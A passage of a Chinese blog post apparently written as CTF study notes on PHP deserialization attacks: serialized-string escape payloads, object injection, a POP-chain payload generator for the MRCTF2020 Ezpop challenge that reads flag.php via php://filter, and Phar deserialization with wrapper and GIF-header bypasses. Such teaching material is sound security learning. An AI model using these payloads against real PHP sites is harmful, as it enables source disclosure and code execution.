class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line">	<span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个就是将GET传入的name中的 x 改为了 xx</p>
<p>正常传入不含x的name值就会正常显示</p>
<p>例如：?name&#x3D;abc，此时长度为3</p>
<p>如果我们传入abcx，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢出（长度大于4）</p>
<p>进而影响下面的反序列化</p>
<p>我们可以利用这一点来实现字符串逃逸</p>
<p>构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=abcxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p>当我们构造name时，在abc后写20个x，而且后面 “;i:1;s:6:”whoami”;} 也是20的长度</p>
<p>在进行change时，这里的20个x就变成了40个x，刚好符合序列化时的长度</p>
<p>从而造成 <strong>“;i:1;s:6:”whoami”;}</strong> 溢出，前面的”闭合前串，后面的;}闭合反序列化的全过程</p>
<p>而先前存在的**$age**被舍弃（因为这里数组只有两个元素），不影响反序列化的过程</p>
<p><strong>总之，age被我们控制</strong></p>
<p>2.过滤后字符变少</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line">	<span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里将xx替换为x</p>
<p>正常传入 <strong>?name&#x3D;aaa&amp;age&#x3D;18</strong></p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021405597.png" alt="image-20231002125445067"></p>
<p>构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=18&quot;;s:3:&quot;age&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被”吃掉“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;age&quot;;s:28:&quot;18</span><br></pre></td></tr></table></figure>

<p>注意 <strong>“;s:3:”age”;s:28:</strong> 这一部分本来就有，后面的 <strong>18”;s:3:”age”;s:6:”whoami”;}</strong> 为我们所构造的</p>
<p>age被我们控制</p>
<p><strong>ctfshow web262</strong></p>
<h2 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h2><p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p>
<p>前提需要满足两个条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、unserialize的参数可控。</span><br><span class="line"><span class="number">2</span>、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;23456&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>脚本结束时会调用**__destruct()函数**，同时会覆盖test变量输出<code>23456</code></p>
<h2 id="POP链的构造利用"><a href="#POP链的构造利用" class="headerlink" title="POP链的构造利用"></a>POP链的构造利用</h2><h3 id="POP链简单介绍"><a href="#POP链简单介绍" class="headerlink" title="POP链简单介绍"></a>POP链简单介绍</h3><p>前面的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<p>MRCTF2020-Ezpop</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//当尝试将对象调用为函数时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>  <span class="variable">$b</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;   <span class="comment">//当调用一个不存在的或者是无法访问的属性的时候被调用</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>共有3个类，反序列化会调用__wakeup，存在于Show类</p>
<p>__wake中的**$this-&gt;source<strong>可控，也就是Show中</strong>$source**变量可控</p>
<p>思路：将**$source<strong>构造成一个对象Show，当</strong>$source<strong>为一个对象时。就会执行Show类中的</strong>__toString**</p>
<p>此时将**$str<strong>指向</strong>Test类**</p>
<p><strong>$this-&gt;str-&gt;source</strong>：取str类中的source值，使这个值自动调用**__get**</p>
<p>此时将$p构造成new Modifier</p>
<p>return $function() 表示将function当作函数返回</p>
<p>当类变量直接当作函数调用的时候，就会调用魔术方法**__invoke**</p>
<p>然后将$va构造成读取源码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = &#x27;php://filter/read=convert.base64-encode/recource=flag.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;memory_limit&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>来自：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av414266940/">https://www.bilibili.com/video/av414266940/</a></p>
<h2 id="PHP原生类反序列化利用（暂无）"><a href="#PHP原生类反序列化利用（暂无）" class="headerlink" title="PHP原生类反序列化利用（暂无）"></a>PHP原生类反序列化利用（暂无）</h2><h2 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h2><p><strong>ctfshow 276</strong></p>
<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
<h3 id="什么是phar文件"><a href="#什么是phar文件" class="headerlink" title="什么是phar文件"></a>什么是phar文件</h3><p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar:&#x2F;&#x2F;就是一种内置的流包装器。</p>
<p>php中一些常见的流包装器如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h3 id="phar文件的结构"><a href="#phar文件的结构" class="headerlink" title="phar文件的结构"></a>phar文件的结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</span><br><span class="line">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span><br><span class="line">content:被压缩文件的内容</span><br><span class="line">signature (可空):签名，放在末尾。</span><br></pre></td></tr></table></figure>

<p>下面生成一个phar文件</p>
<p>前提：开启php.ini中的 <strong>phar.readonly &#x3D; off</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h3><p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021449095.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure>

<p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;phar.phar</p>
<p>GIF格式验证可以通过在文件头部添加GIF89a绕过 1、$phar-&gt;setStub(“GIF89a”.”<?php __HALT_COMPILER(); ?>“); &#x2F;&#x2F;设置stub 2、生成一个phar.phar，修改后缀名为phar.gif</p>
<h2 id="php-session反序列化"><a href="#php-session反序列化" class="headerlink" title="php-session反序列化"></a>php-session反序列化</h2><h3 id="session简单介绍"><a href="#session简单介绍" class="headerlink" title="session简单介绍"></a>session简单介绍</h3><p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
<p>当第一次访问网站时，**seesion_start()**函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
<h3 id="session-的存储机制"><a href="#session-的存储机制" class="headerlink" title="session 的存储机制"></a>session 的存储机制</h3><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 存储的文件是以sess_sessionid来进行命名的</p>
<p>session_start();运行之后开启session并且产生一个唯一的32位的session_id</p>
<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="session-upload-progress进行文件包含和反序列化渗透"><a href="#session-upload-progress进行文件包含和反序列化渗透" class="headerlink" title="session.upload_progress进行文件包含和反序列化渗透"></a>session.upload_progress进行文件包含和反序列化渗透</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<h4 id="使用不同的引擎来处理session文件"><a href="#使用不同的引擎来处理session文件" class="headerlink" title="使用不同的引擎来处理session文件"></a>使用不同的引擎来处理session文件</h4><p>$_SESSION变量直接可控</p>
<p>php引擎的存储格式是<code>键名|serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。如果程序使用两个引擎来分别处理的话就会出现问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;aaa&#x27;</span>] = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="comment">//aaa|s:3:&quot;bbb&quot;;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;aaa&#x27;</span>] = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="comment">//a:1:&#123;s:3:&quot;aaa&quot;;s:3:&quot;bbb&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>ctfshow web263</strong></p>
<p>python反序列化</p>
<p>ctfshow277，278</p>
<p>参考：<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/113588692">https://y4tacker.blog.csdn.net/article/details/113588692</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cln8f3hz70000vwtg1lmodtfa" data-title="php反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/01/11/%E9%92%93%E9%B1%BC%E5%8F%8A%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80/">钓鱼及部分免杀</a>
          </li>
        
          <li>
            <a href="/2022/07/13/Docker%E5%9F%BA%E7%A1%80/">Docker基础</a>
          </li>
        
          <li>
            <a href="/2022/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


